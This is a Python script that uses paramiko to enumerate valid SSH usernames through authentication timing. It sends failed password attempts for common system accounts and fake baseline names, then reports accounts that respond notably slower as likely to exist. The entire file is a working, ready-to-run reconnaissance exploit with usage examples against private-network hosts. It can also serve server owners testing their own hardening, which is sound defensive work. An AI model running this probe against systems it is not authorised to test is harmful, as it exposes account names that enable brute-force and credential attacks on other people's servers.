#!/usr/bin/env python3
"""
SSH User Enumeration via Authentication Timing Side-Channel

Tests whether an SSH server reveals valid usernames through timing
differences in authentication failure responses. Valid users typically
trigger PAM authentication checks (slower) while nonexistent users
are rejected immediately (faster).

Based on DeepSeek finding: "Timing Side-Channel in Public Key Authentication"

Usage: python probe_ssh_timing.py <host> [port] [rounds]

Examples:
    python probe_ssh_timing.py 192.168.0.129
    python probe_ssh_timing.py 192.168.0.129 22 5
    python probe_ssh_timing.py localhost 22 10
"""

import paramiko
import socket
import sys
import time
import statistics


def measure_auth_timing(host, port, username, rounds=3):
    """Measure average auth failure time for a username."""
    times = []
    for _ in range(rounds):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((host, port))
            t = paramiko.Transport(sock)
            t.start_client()

            t0 = time.monotonic()
            try:
                t.auth_password(username, 'wrong_password_probe_12345')
            except paramiko.AuthenticationException:
                pass
            except paramiko.SSHException:
                pass
            elapsed = time.monotonic() - t0
            times.append(elapsed)

            t.close()
            sock.close()
        except Exception as e:
            print(f"    Connection error for {username}: {e}", file=sys.stderr)
        time.sleep(0.1)

    return times


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <host> [port] [rounds]")
        print(f"")
        print(f"Tests SSH user enumeration via authentication timing.")
        print(f"Compares response time for common usernames vs nonexistent ones.")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 22
    rounds = int(sys.argv[3]) if len(sys.argv) > 3 else 5

    # Mix of likely-valid and definitely-invalid usernames
    test_users = [
        # Common system users (likely to exist)
        'root', 'admin', 'test', 'nobody', 'www-data', 'sshd',
        # Definitely nonexistent
        'nonexistent_user_xyz_99', 'fakename_abc_12345', 'zzz_no_such_user_777',
    ]

    print(f"SSH Timing Side-Channel Probe — {host}:{port}")
    print(f"Rounds per user: {rounds}")
    print(f"")

    # Get banner first
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        banner = b''
        while not banner.endswith(b'\n'):
            banner += sock.recv(1024)
        sock.close()
        print(f"Banner: {banner.decode(errors='replace').strip()}")
    except:
        pass
    print()

    results = {}
    for user in test_users:
        times = measure_auth_timing(host, port, user, rounds)
        if times:
            avg = statistics.mean(times)
            stddev = statistics.stdev(times) if len(times) > 1 else 0
            results[user] = {'avg': avg, 'stddev': stddev, 'times': times}
            times_str = ', '.join(f'{t:.3f}' for t in times)
            print(f"  {user:35s}  avg={avg:.3f}s  std={stddev:.3f}s  ({times_str})")
        else:
            print(f"  {user:35s}  FAILED")

    if not results:
        print("\nNo results collected.")
        return

    # Analysis
    print()
    print("=" * 60)
    print("Analysis")
    print("=" * 60)

    fake_users = [u for u in results if u.startswith('nonexistent') or u.startswith('fakename') or u.startswith('zzz_')]
    real_candidates = [u for u in results if u not in fake_users]

    if not fake_users:
        print("No baseline (nonexistent) users — can't compare.")
        return

    baseline_avg = statistics.mean([results[u]['avg'] for u in fake_users])
    print(f"\nBaseline (nonexistent users): {baseline_avg:.3f}s avg")
    print()

    # Flag users that are significantly slower than baseline
    THRESHOLD = 1.3  # 30% slower = likely real user with PAM check
    print(f"{'Username':35s}  {'Avg':>7s}  {'vs Base':>8s}  {'Verdict'}")
    print(f"{'-'*35}  {'-'*7}  {'-'*8}  {'-'*20}")

    enumerated = []
    for user in real_candidates:
        avg = results[user]['avg']
        ratio = avg / baseline_avg if baseline_avg > 0 else 0
        if ratio > THRESHOLD:
            verdict = f"LIKELY EXISTS ({ratio:.1f}x slower)"
            enumerated.append(user)
        elif ratio < 0.7:
            verdict = f"fast ({ratio:.1f}x)"
        else:
            verdict = f"inconclusive ({ratio:.1f}x)"
        print(f"  {user:35s}  {avg:>6.3f}s  {ratio:>7.1f}x  {verdict}")

    print()
    if enumerated:
        print(f"[FINDING] Probable valid users via timing: {', '.join(enumerated)}")
        print(f"          Threshold: {THRESHOLD}x baseline ({baseline_avg:.3f}s)")
        print(f"          These users likely exist on the system.")
    else:
        print(f"[OK] No significant timing differences detected.")
        print(f"     Server appears resistant to timing-based user enumeration.")


if __name__ == "__main__":
    main()
